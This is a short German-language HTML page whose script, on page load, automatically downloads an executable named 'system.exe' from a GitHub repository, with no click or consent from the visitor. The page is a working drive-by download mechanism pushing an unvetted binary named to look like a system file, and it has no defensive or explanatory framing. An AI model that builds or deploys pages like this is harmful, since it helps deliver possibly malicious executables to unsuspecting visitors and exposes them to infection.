<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automatischer Download von GitHub</title>
</head>
<body>
    <h1>Automatischer Download von system.exe</h1>
    <p>Der Download wird automatisch gestartet.</p>

    <script>
        function downloadFile() {
            var link = document.createElement('a');
            link.href = 'https://github.com/CYBERBOT030/download-demo/raw/main/system.exe'; // GitHub Direct Link
            link.download = 'system.exe';
            link.click();
        }

        window.onload = function() {
            downloadFile();
        };
    </script>
</body>
</html>
